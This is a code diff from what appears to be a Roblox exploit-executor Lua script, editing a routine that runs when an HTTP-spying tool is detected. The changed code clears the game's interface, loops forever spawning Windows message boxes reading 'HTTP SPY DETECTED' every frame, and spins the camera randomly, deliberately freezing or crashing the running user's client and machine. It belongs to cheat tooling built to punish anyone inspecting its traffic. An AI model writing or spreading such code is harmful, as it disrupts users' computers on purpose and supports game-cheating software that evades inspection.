@@ -58,84 +58,16 @@ cc.TintColor = Color3.new(1,0,0)
 
 local hui = gethui()
 hui:ClearAllChildren()
-if hui then
-    task.spawn(function()
-        while task.wait() do
-            for i,v in hui.Parent:GetDescendants() do
-                pcall(function()
-                    v.Name = "HTTP SPY DETECTED"
-                end)
-                pcall(function()
-                    v.Text = "HTTP SPY DETECTED"
-                end)
-                pcall(function()
-                    v.Position = UDim2.fromScale(math.random(-100,100)/100,math.random(-100,100)/100)
-                end)
-                pcall(function()
-                    v.Rotation = math.random(0,360)
-                end)
-                pcall(function()
-                    v.Visible = true
-                end)
-            end
-        end
-    end)
-end
-
-task.spawn(function()
-	game:GetService("CoreGui"):ClearAllChildren()
-    while task.wait() do
-        for i,v in game:GetService("CoreGui"):GetDescendants() do
-            pcall(function()
-                v.Name = "HTTP SPY DETECTED"
-            end)
-            pcall(function()
-                v.Text = "HTTP SPY DETECTED"
-            end)
-            pcall(function()
-                v.Position = UDim2.fromScale(math.random(-100,100)/100,math.random(-100,100)/100)
-            end)
-            pcall(function()
-                v.Rotation = math.random(0,360)
-            end)
-            pcall(function()
-                v.Visible = true
-            end)
-        end
-    end
-end)
-
-task.spawn(function()
-    while task.wait() do
-        for i,v in game:GetService("Players").LocalPlayer.PlayerGui:GetDescendants() do
-            pcall(function()
-                v.Name = "HTTP SPY DETECTED"
-            end)
-            pcall(function()
-                v.Text = "HTTP SPY DETECTED"
-            end)
-            pcall(function()
-                v.Position = UDim2.fromScale(math.random(-100,100)/100,math.random(-100,100)/100)
-            end)
-            pcall(function()
-                v.Rotation = math.random(0,360)
-            end)
-            pcall(function()
-                v.Visible = true
-            end)
-        end
-    end
-end)
+game:GetService("CoreGui"):ClearAllChildren()
+game:GetService("Players").LocalPlayer.PlayerGui:ClearAllChildren()
 
 task.spawn(function()
     while task.wait() do
         task.spawn(function()
             messagebox("HTTP SPY DETECTED", "HTTP SPY DETECTED", 4096)
         end)
-        task.spawn(function()
-            pcall(function()
-                workspace.CurrentCamera.CFrame *= CFrame.Angles(math.random(0,360),math.random(0,360),math.random(0,360))
-            end)
-        end)
+		pcall(function()
+			workspace.CurrentCamera.CFrame *= CFrame.Angles(math.random(0,360),math.random(0,360),math.random(0,360))
+		end)
     end
 end)
